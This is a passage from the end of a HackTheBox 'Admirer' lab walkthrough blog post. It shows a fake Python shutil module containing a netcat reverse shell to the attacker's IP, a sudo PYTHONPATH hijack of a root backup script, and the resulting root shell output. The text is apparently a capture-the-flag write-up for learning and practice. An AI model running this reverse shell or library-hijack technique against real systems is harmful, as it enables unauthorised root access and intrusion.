+waldo@admirer:/tmp/temp<span class="nv">$ </span><span class="nb">cat </span>shutil.py 
+<span class="c">#!/usr/bin/python3</span>
+
+def make_archive<span class="o">(</span>x,y,z<span class="o">)</span>:
+	import os
+	os.system<span class="o">(</span><span class="s2">"nc 10.10.14.19 9889 -e /bin/bash"</span><span class="o">)</span></code></pre></figure>
+
+<p>Starting the nmap listener on local machine <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code>. And then execute our <code class="highlighter-rouge">admin_tasks.sh</code> script with option 6 but main point is, we need to export <code class="highlighter-rouge">pythonpath</code> as pwd i.e <code class="highlighter-rouge">/tmp/temp</code> folder so that the script uses our <code class="highlighter-rouge">fake shutil</code> library/module.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">waldo@admirer:/tmp/temp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-E</span> <span class="nv">PYTHONPATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> /opt/scripts/admin_tasks.sh 
+
+<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
+1<span class="o">)</span> View system <span class="nb">uptime
+</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
+</span>3<span class="o">)</span> View crontab
+4<span class="o">)</span> Backup passwd file
+5<span class="o">)</span> Backup shadow file
+6<span class="o">)</span> Backup web data
+7<span class="o">)</span> Backup DB
+8<span class="o">)</span> Quit
+Choose an option: 6
+Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...</code></pre></figure>
+
+<p>Looking at our rev shell, and yes we got a connection.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+listening on <span class="o">[</span>any] 9889 ...
+connect to <span class="o">[</span>10.10.14.19] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.187] 42894
+<span class="nb">whoami
+</span>root
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">pwd</span>
+/tmp/temp
+<span class="nb">cd</span> /root
+<span class="nb">wc</span> <span class="nt">-c</span> root.txt
+33 root.txt</code></pre></figure>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-admirer&via=fumenoid&text=HackTheBox - Admirer : Walkthrough of Admirer box on Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-admirer" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    Happy Hacking :D
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
